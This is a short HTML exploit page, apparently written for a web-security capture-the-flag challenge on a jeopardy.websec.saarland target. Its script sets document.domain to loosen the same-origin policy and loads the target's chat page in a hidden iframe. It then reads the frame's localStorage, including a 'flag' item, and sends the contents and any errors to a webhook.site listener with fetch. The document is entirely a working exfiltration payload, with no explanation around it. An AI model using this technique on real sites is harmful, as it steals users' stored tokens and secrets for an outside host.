<!DOCTYPE html>
<html>
<body>
<script>
    // 1. RELAX THE SOP (Match what the target uses!)
    document.domain = 'jeopardy.websec.saarland'; 

    // 2. CREATE THE INVISIBLE FRAME TARGETING THE CHAT
    var i = document.createElement('iframe');
    i.style.display = 'none';
    // Ensure this URL is the correct Chat location
    i.src = "https://owley-madison.jeopardy.websec.saarland/chat"; 
    document.body.appendChild(i);

    // 3. EXECUTE WHEN LOADED
    i.onload = function() {
        try {
            // Access the chat window's Local Storage
            var secret = i.contentWindow.localStorage.getItem('flag') || 
                         JSON.stringify(i.contentWindow.localStorage);

            // Exfiltrate to your listener
            fetch('https://webhook.site/a73c9568-0d8d-4636-b1f7-cf744ccfff37?data=' + encodeURIComponent(secret));
        } catch(e) {
            // Debugging: Send errors back so you know if SOP failed
            fetch('https://webhook.site/a73c9568-0d8d-4636-b1f7-cf744ccfff37?error=' + encodeURIComponent(e.message));
        }
    };
</script>
</body>
</html>
